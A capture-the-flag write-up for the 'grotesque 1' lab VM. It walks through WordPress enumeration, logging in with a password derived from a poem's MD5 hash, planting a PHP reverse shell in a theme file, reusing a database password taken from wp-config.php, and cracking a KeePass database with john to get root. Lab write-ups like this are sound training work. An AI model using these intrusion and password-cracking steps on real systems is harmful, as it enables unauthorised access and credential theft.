# grotesque 1 Writeup
# Description
```bash
get flags

difficulty: medium

about vm: tested and exported from virtualbox. dhcp and nested vtx/amdv enabled. you can contact me by email for troubleshooting or questions.
```
# Exploitation
Let's start with a network scan
```bash
 Currently scanning: 192.168.0.111/24   |   Screen View: Unique Hosts                                                                                                                                             
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.0.103   40:65:d4:5e:e0:3e      1      60  Unknown vendor                                                                                                                                                 
 192.168.0.113   08:00:27:11:39:00      1      60  PCS Systemtechnik GmbH                                                                                                                                         
 192.168.0.102   d8:80:83:cf:7a:77      1      60  CLOUD NETWORK TECHNOLOGY SINGAPORE PTE. LTD.
```
\
Next, checking open ports 
```bash
66/tcp open  http    WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
80/tcp open  http    Apache httpd 2.4.38
```
\
<img width="1541" height="655" alt="image" src="https://github.com/user-attachments/assets/4b896d79-79ce-4c95-8177-a647d4cb32b6" />
\
On port 66 there was a website with a zip file and unzipping it contained
```bash
drwxrwxr-x 8 kali kali  4096 Jan 18  2021 .
drwxrwxr-x 3 kali kali  4096 Feb 27 14:50 ..
drwxrwxr-x 2 kali kali  4096 Jan 18  2021 assets
-rw-rw-r-- 1 kali kali  1694 Jan 16  2021 changelog.txt
-rw-rw-r-- 1 kali kali   237 Jan 16  2021 _config.yml
drwxrwxr-x 2 kali kali  4096 Jan 16  2021 _data
-rw-rw-r-- 1 kali kali   142 Jan 16  2021 functions.md
-rw-rw-r-- 1 kali kali    44 Jan 16  2021 Gemfile
-rw-rw-r-- 1 kali kali  1540 Jan 16  2021 Gemfile.lock
-rw-rw-r-- 1 kali kali    66 Jan 16  2021 .gitattributes
-rw-rw-r-- 1 kali kali    29 Jan 16  2021 .gitignore
drwxrwxr-x 2 kali kali  4096 Jan 16  2021 _includes
-rw-rw-r-- 1 kali kali   113 Jan 18  2021 index.md
drwxrwxr-x 2 kali kali  4096 Jan 16  2021 _layouts
-rw-rw-r-- 1 kali kali 35149 Jan 16  2021 LICENSE
-rw-rw-r-- 1 kali kali 35149 Jan 16  2021 license.txt
-rw-rw-r-- 1 kali kali   185 Jan 16  2021 Makefile
drwxrwxr-x 2 kali kali  4096 Jan 16  2021 scripts
-rw-rw-r-- 1 kali kali 92180 Jan 18  2021 sshpasswd.png
-rw-rw-r-- 1 kali kali   104 Jan 16  2021 .travis.yml
drwxrwxr-x 2 kali kali 12288 Jan 18  2021 _vvmlist
-rw-rw-r-- 1 kali kali    47 Jan 16  2021 .yamllint
```
\
After a lot of checking around , we see that in the file
```bash
vvmlist.github.io\_vvmlist> cat sense.md
   -
  for wordpress, it's on port 80/lyricsblog:
    -
```
\
We have a endpoint and lets go there 
\
<img width="1452" height="714" alt="image" src="https://github.com/user-attachments/assets/8e5d7b96-0e13-4bdb-81f0-084d2789486b" />
\
Here we used wpscan 
```bash
[i] User(s) Identified:

[+] erdalkomurcu
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.0.113/lyricsblog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)
```
\
This was the only useful info found and after some time i converted this poem on one of the posts into md5 
```bash
echo "Çaresiz derdimin sebebi belli 
Dermanı yaramda arama doktor
Şifa bulmaz gönlüm senin elinden
Boşuna benimle uğraşma doktor

Aşk yarasıdır bu ilaç kapatmaz
Derdin teselli beni avutmaz
Dermanı yardadır sende bulunmaz
Boşuna benimle uğraşma doktor
Dokunma benim gönül yarama
Dokunma doktor

Bedenimde değil kalbimde derdim
Tek alışkanlığım bir zalim sevdim
Sen çekil yanımdan sevdiğim gelsin
Boşuna zamanı harcama doktor" | md5sum
bc78c6ab38e114d6135409e44f7cdda2  -
```
\
<img width="1222" height="720" alt="image" src="https://github.com/user-attachments/assets/17fedbfa-c5f0-4d5d-b7a9-bbe4a4a67c29" />
\
Since it says password to be uppercase , we put in uppercase and login
\
<img width="1704" height="724" alt="image" src="https://github.com/user-attachments/assets/4433b263-64a1-421c-bad1-816f43cba66b" />
\
Then i edit a php file with our php revshell payload
\
<img width="1707" height="756" alt="image" src="https://github.com/user-attachments/assets/d2b3d8aa-cf48-4e3c-b98a-03a8a54c3fc3" />
\
then once we reload the blog , we get a rev shell
```bash
penelope                  
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.0.111
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from grotesque~192.168.0.113-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/grotesque~192.168.0.113-Linux-x86_64/2026_02_27-15_02_57-941.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@grotesque:/$ cd ~
www-data@grotesque:/var/www$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@grotesque:/var/www$ ls -la
total 12
drwxr-xr-x  3 root root 4096 Dec 17  2020 .
drwxr-xr-x 13 root root 4096 Dec 17  2020 ..
drwxr-xr-x  3 root root 4096 Jan 18  2021 html
```
\
We see that the machine has a user raphael
```bash
cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
raphael:x:1000:1000:,,,:/home/raphael:/bin/bash
```
\
And checking wp-config.php gave
```bash
/** MySQL database username */
define( 'DB_USER', 'raphael' );

/** MySQL database password */
define( 'DB_PASSWORD', '_double_trouble_' );
```
\
So i use the same password to change into the user raphael
```bash
raphael@grotesque:~$ ls -la
total 24
drwxr-xr-x  4 raphael raphael 4096 Feb 27 13:31 .
drwxr-xr-x  3 root    root    4096 Jan 18  2021 ..
-rwx------  1 raphael raphael 2174 Jan 18  2021 .chadroot.kdbx
drwx------  3 raphael raphael 4096 Feb 27 13:31 .gnupg
-r-x------  1 raphael raphael   32 Jan 18  2021 user.txt
drwxr-xr-x 10 raphael raphael 4096 Jan 18  2021 vvmlist.github.io
raphael@grotesque:~$ cat user.txt 
F6ACB21652E095630BB1BEBD1E587FE7raphael@grotesque:~$ sudo -l
bash: sudo: command not found
```
\
Then we see that there is a keepass file in the home dir
```bash
raphael@grotesque:~$ ls -la
total 24
drwxr-xr-x  4 raphael raphael 4096 Feb 27 13:31 .
drwxr-xr-x  3 root    root    4096 Jan 18  2021 ..
-rwx------  1 raphael raphael 2174 Jan 18  2021 .chadroot.kdbx
drwx------  3 raphael raphael 4096 Feb 27 13:31 .gnupg
-r-x------  1 raphael raphael   32 Jan 18  2021 user.txt
drwxr-xr-x 10 raphael raphael 4096 Jan 18  2021 vvmlist.github.io
raphael@grotesque:~$ file .chadroot.kdbx 
.chadroot.kdbx: Keepass password database 2.x KDBX
```
\
So , lets try to crack it ,first we convert the file into a hash to crack using john , for that we use 
```bash
keepass2john .chadroot.kdbx > keepass-hash
```
\
Next, we put john to crack the hash
```bash
john -w:/usr/share/wordlists/rockyou.txt keepass-hash                             
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:32 0.14% (ETA: 2026-02-28 21:39) 0g/s 157.5p/s 157.5c/s 157.5C/s pooh1..p00hbear
chatter          (.chadroot)     
1g 0:00:02:55 DONE (2026-02-27 15:13) 0.005711g/s 154.0p/s 154.0c/s 154.0C/s colombiano..candyapple
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
\
so , i put the file and the password into this website and see that there are 4 passwords with the user root , so i try all of them until this works
\
<img width="1566" height="664" alt="image" src="https://github.com/user-attachments/assets/4e39b085-00a4-44ac-9001-4665d9a0e6eb" />
\
```bash
raphael@grotesque:~$ su root
Password: 
root@grotesque:/home/raphael# cd /root
root@grotesque:~# cat root.txt 
AF7DD472654CBBCF87D3D7F509CB9862
```
\
The end , thank you for reading till here
